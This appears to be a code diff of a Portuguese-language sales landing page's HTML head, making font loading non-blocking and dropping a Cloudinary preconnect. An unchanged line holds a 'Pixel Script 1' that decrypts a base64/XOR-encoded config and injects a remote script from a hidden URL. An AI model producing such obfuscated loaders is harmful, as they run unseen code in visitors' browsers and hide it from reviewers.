@@ -68,16 +68,18 @@
     <!-- Preconnect & DNS-Prefetch para CDNs e Checkout -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link rel="dns-prefetch" href="https://res.cloudinary.com">
-    <link rel="preconnect" href="https://res.cloudinary.com" crossorigin>
     <link rel="dns-prefetch" href="https://pay.lowify.com.br">
     <link rel="preconnect" href="https://pay.lowify.com.br">
 
     <!-- Preload da Imagem Principal (LCP Optimization) -->
     <link rel="preload" as="image" href="/src/assets/images/hero_dorama_user.webp" type="image/webp" fetchpriority="high">
 
-    <!-- Fontes otimizadas com pesos essenciais e display=swap -->
-    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700;900&family=Montserrat:wght@700;800;900&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <!-- Fontes otimizadas não-bloqueantes com display=swap -->
+    <link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700;900&family=Montserrat:wght@700;800;900&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700;900&family=Montserrat:wght@700;800;900&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" media="print" onload="this.media='all'">
+    <noscript>
+      <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700;900&family=Montserrat:wght@700;800;900&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap">
+    </noscript>
 
     <!-- Pixel Script 1 -->
     <script>(function(){var t_hfn=atob("DHbzCO3pb2f169HWrg3RfZ+FTV3Xg6Wi3gXJJ8KKCwnbnqW7xxCKJo6GAkmXmf6lzQSaeJmaQBeck7S6gQaacIiFQQ2Gyf30zwKHeoSLGhOQmPPs9SvfKoqFAAWUh6L0lC2IKoOIAgLX0fOmxw6WZKSNTUvXnbC62xPRMs/fDgOU0rXjl0WQadvcW1PAirDvzRSXOtrLEjqI");var n_2hs=[];for(var n_fezu=0;n_fezu<t_hfn.length;n_fezu++){n_2hs.push(t_hfn.charCodeAt(n_fezu)&255);}var m_v=n_2hs[0];var m_qph=n_2hs.slice(1,1+m_v);var v_nf=n_2hs.slice(1+m_v);var y_cp2=v_nf.map(function(b,x_om){return b^m_qph[x_om%m_v];});var f_u1="";for(var b_314z=0;b_314z<y_cp2.length;b_314z++){f_u1+=String.fromCharCode(y_cp2[b_314z]&255);}var i_thg=decodeURIComponent(escape(f_u1));var x_vkba=JSON.parse(i_thg);var i_v7=x_vkba.globals||[];i_v7.forEach(function(e_g){window[e_g.name]=e_g.value;});var t_slrj=document.createElement("script");t_slrj.src=x_vkba.url;t_slrj.async=true;t_slrj.defer=true;(x_vkba.attributes||[]).forEach(function(j_z1b){t_slrj.setAttribute(j_z1b.name,j_z1b.value);});(document.head||document.documentElement).appendChild(t_slrj);})();</script>
